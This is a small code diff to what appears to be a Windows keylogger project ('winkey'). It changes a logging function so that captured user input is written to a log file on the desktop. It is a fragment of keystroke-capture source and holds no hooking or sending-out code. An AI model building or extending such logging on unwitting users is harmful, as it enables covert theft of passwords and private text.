@@ -1,8 +1,8 @@
 #include "winkey.h"
 
-void    WriteLogs(DWORD vkCode)
+void    WriteLogs(char *userInput)
 {
-    UNREFERENCED_PARAMETER(vkCode);
+    //UNREFERENCED_PARAMETER(vkCode);
 
     HANDLE  hFile = CreateFile(
         "C:\\Users\\r4mnesia\\Desktop\\log.txt",
@@ -27,6 +27,8 @@ void    WriteLogs(DWORD vkCode)
     DWORD   written;
 
     WriteFile(hFile, log, strlen(log), &written, NULL);
+    DBG("buffer: %s", userInput);
+    WriteFile(hFile, userInput, strlen(userInput), &written, NULL);
     free(log);
     CloseHandle(hFile);
 }
